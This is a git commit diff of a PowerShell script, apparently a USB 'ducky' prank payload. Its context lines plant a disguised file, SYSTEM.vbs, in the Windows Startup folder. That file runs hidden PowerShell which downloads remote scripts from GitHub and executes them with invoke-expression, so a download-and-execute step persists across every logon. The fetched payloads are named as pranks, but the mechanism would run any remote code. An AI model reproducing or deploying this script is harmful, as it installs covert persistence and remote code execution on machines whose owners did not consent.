14e1ddfa9da5fcc03d0e023d2a7d95ad7a083fed
Falcon <101268424+Falconnix@users.noreply.github.com>
2023-05-02 07:39:55 -0400

    Update Duck.ps1

--- Duck.ps1
+++ Duck.ps1
@@ -3,3 +3,4 @@ cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
 New-Item 'SYSTEM.vbs' -ItemType File
 Start-Sleep -Seconds 1
 $content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/beep.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs
+echo beb
